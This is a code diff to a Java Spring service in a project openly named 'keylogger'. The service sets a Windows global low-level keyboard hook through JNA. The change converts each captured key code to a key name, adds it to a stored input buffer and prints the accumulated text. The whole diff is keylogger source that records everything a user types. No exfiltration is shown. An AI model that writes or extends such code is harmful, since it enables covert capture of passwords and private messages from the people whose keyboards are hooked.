@@ -1,5 +1,6 @@
 package com.badar.keylogger.Services;
 
+import com.badar.keylogger.Helpers.KeyCodeConverter;
 import com.sun.jna.Pointer;
 import com.sun.jna.platform.win32.*;
 import com.sun.jna.platform.win32.WinDef.LRESULT;
@@ -9,6 +10,8 @@ import org.springframework.stereotype.Service;
 
 @Service
 public class GlobalKeyListenerService {
+    private boolean shiftPressed = false;
+    private StringBuilder storedInput = new StringBuilder();
     private static HHOOK hHook;
     private static final User32 user32 = User32.INSTANCE;
 
@@ -17,7 +20,10 @@ public class GlobalKeyListenerService {
             public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                 if (nCode >= 0) {
                     if (wParam.intValue() == WinUser.WM_KEYDOWN) {
-                        System.out.println("Key pressed: " + info.vkCode);
+                        String keypressed = KeyCodeConverter.getKeyName(info.vkCode);
+                        storedInput.append(keypressed);
+                        System.out.println(storedInput);
+                        System.out.println("Key pressed: " + keypressed);
                     }
                 }
                 // CORRECT: Use Pointer.peer to get the native long value
